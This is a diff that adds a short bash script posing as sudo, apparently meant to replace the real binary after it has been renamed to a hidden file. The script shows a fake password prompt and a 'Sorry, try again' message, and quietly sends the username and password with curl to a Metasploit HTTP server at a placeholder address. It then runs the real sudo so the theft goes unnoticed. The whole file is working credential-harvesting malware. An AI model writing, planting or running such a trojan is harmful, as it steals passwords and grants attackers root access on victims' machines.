@@ -1,0 +1,22 @@
+#!/bin/bash
+#change to /usr/bin/.sudo or wherever the real sudo is
+Osudo=/usr/bin/.sudo
+
+#if no args given then run the original command for the help message
+if [ "$1" == "" ]
+then
+    $Osudo
+else
+    #collect info
+    echo -n "[sudo] password for $USER: "
+    read -s pass
+    echo ""
+    sleep 2;
+    echo "Sorry, try again."
+
+    #send username and password to out metasploit http server
+    curl -s --user "$USER:$pass" http://metasploit.http.serv.ip/ &>/dev/null
+
+    #invoke original command
+    $Osudo $@
+fi
